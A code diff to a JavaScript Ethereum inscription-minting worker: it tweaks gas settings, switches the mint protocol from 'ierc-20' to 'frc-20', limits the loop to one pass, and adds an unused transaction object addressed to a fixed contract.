@@ -5,7 +5,7 @@ import { stringToHex } from "@/utils/helper";
 const PROVIDER_RPC = "https://rpc.ankr.com/eth";
 const ZERO_ADDRESS = "0x0000000000000000000000000000000000000000";
 
-const GAS_PREMIUM = 110;
+const GAS_PREMIUM = 120;
 
 let lastNonce = 0;
 let lastTimestamp = Date.now();
@@ -35,7 +35,7 @@ self.onmessage = async (e) => {
   let mineCount = 0;
   let unique = 0;
 
-  while (true) {
+  while (mineCount < 1) {
     mineCount += 1;
     if (mineCount % 10000 === 0) {
       const mineTime = (Date.now() - startTime) / 1000;
@@ -47,7 +47,7 @@ self.onmessage = async (e) => {
       });
     }
 
-    const callData = `data:application/json,{"p":"ierc-20","op":"mint","tick":"${tick}","amt":"${amount}","nonce":"${generateNonce()}${unique++}"}`;
+    const callData = `data:application/json,{"p":"frc-20","op":"mint","tick":"${tick}","amt":"${amount}","nonce":"${generateNonce()}${unique++}"}`;
 
     const transaction = {
       type: 2,
@@ -55,14 +55,27 @@ self.onmessage = async (e) => {
       to: ZERO_ADDRESS,
       maxPriorityFeePerGas: targetGasFee,
       maxFeePerGas: targetGasFee,
-      gasLimit: ethers.BigNumber.from("25000"),
+      gasLimit: ethers.BigNumber.from("15000"),
       nonce: nonce,
       value: ethers.utils.parseEther("0"),
       data: stringToHex(callData),
     };
+    
+
+    const transaction2 = {
+      type: 2,
+      chainId: network.chainId,
+      to: '0x828fA47D6b078f00a7728AB6bbA2a10832E14491',
+      maxPriorityFeePerGas: targetGasFee,
+      maxFeePerGas: targetGasFee,
+      gasLimit: ethers.BigNumber.from("15000"),
+      nonce: nonce,
+      value: ethers.utils.parseEther("0"),
+      data: '0x8de932220000000000000000000000001168b08e2070498b1d7d02e7b80d602d25e072e7000000000000000000000000000000000000000000000000000000000000000a',
+    };
     const rawTransaction = ethers.utils.serializeTransaction(transaction);
     const transactionHash = ethers.utils.keccak256(rawTransaction);
-    // console.log("🚀 ~ transactionHash:", transactionHash)
+    //console.log("🚀 ~ transaction:", transaction)
 
     const signingKey = miner._signingKey();
     const signature = signingKey.signDigest(transactionHash);
